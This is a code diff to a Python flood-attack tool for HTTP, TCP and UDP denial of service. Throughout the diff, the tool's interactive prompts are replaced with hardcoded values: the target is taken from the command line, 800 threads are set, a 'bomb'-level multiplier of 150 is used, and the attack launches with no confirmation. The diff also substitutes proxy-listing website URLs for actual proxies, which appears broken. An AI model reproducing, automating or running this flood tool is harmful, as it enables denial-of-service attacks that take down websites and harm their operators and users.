@@ -52,13 +52,16 @@ useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
 
+proxy_list = ['https://www.proxy-list.download/HTTP', 'https://free-proxy-list.net/', 'https://us-proxy.org']
+
 
 def starturl(): # C0d3d by UN5T48L3
 	global url
 	global url2
 	global urlport
 
-	url = input("\nInsert URL/IP: ").strip()
+	# url = input("\nInsert URL/IP: ").strip()
+	url = sys.argv[1]
 
 	if url == "":
 		print ("Please enter the url.")
@@ -89,7 +92,8 @@ def starturl(): # C0d3d by UN5T48L3
 
 def floodmode():
 	global choice1
-	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	# choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	choice1 = '0'
 	if choice1 == "0":
 		proxymode()
 	elif choice1 == "1":
@@ -131,7 +135,8 @@ def floodport():
 
 def proxymode():
 	global choice2
-	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	# choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	choice2 = 'n'
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -139,7 +144,8 @@ def proxymode():
 
 def choiceproxysocks():
 	global choice3
-	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	# choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	choice3 = '0'
 	if choice3 == "0":
 		choicedownproxy()
 	elif choice3 == "1":
@@ -149,7 +155,8 @@ def choiceproxysocks():
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	# choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	choice4 = 'n'
 	if choice4 == "y":
 		choicemirror1()
 	else:
@@ -202,10 +209,10 @@ def proxyget1(): # C0d3d by UN5T48L3
 				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
 			except:
 				pass
-		out_file = open("proxy.txt","w")
-		out_file.write("")
-		out_file.write(proxies)
-		out_file.close()
+		# out_file = open("proxy.txt","w")
+		# out_file.write("")
+		# out_file.write(proxies)
+		# out_file.close()
 		print ("Proxies downloaded successfully.")
 	except: 
 		print ("\nERROR!\n")
@@ -214,9 +221,10 @@ def proxyget1(): # C0d3d by UN5T48L3
 def inforgeget(): 
 	try:
 		if os.path.isfile("proxy.txt"):
-			out_file = open("proxy.txt","w") 
-			out_file.write("")               
-			out_file.close()
+			pass
+			# out_file = open("proxy.txt","w")
+			# out_file.write("")
+			# out_file.close()
 		else:
 			pass
 		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
@@ -227,15 +235,15 @@ def inforgeget():
 			links = tag.get("href")                                
 			final = base + links                                   
 			result = urllib.request.urlopen(final)                 
-			for line in result :
-				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) 
-				if ip: 
-					for x in ip:
-						out_file = open("proxy.txt","a") 
-						while True:
-							out_file.write(x+"\n")
-							out_file.close()
-							break 
+			# for line in result :
+			# 	ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
+			# 	if ip:
+			# 		for x in ip:
+			# 			out_file = open("proxy.txt","a")
+			# 			while True:
+			# 				out_file.write(x+"\n")
+			# 				out_file.close()
+			# 				break
 		print ("Proxies downloaded successfully.") 
 	except: 
 		print ("\nERROR!\n") 
@@ -243,16 +251,18 @@ def inforgeget():
 
 def proxylist():
 	global proxies
-	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
-	if out_file == "":
-		out_file = "proxy.txt"
-	proxies = open(out_file).readlines()
+	# out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	# if out_file == "":
+	# 	out_file = "proxy.txt"
+	proxies = proxy_list
+	# proxies = open(out_file).readlines()
 	numthreads()
 
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Insert number of threads (800): "))
+		# threads = int(input("Insert number of threads (800): "))
+		threads = 800
 	except ValueError:
 		threads = 800
 		print ("800 threads selected.\n")
@@ -261,14 +271,16 @@ def numthreads():
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		# multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		multiple = 150
 	except ValueError:
 		print("You mistyped, try again.\n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
+	# choice6 = input("Press 'Enter' to start attack: ")
+	choice6 = ''
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": #lool
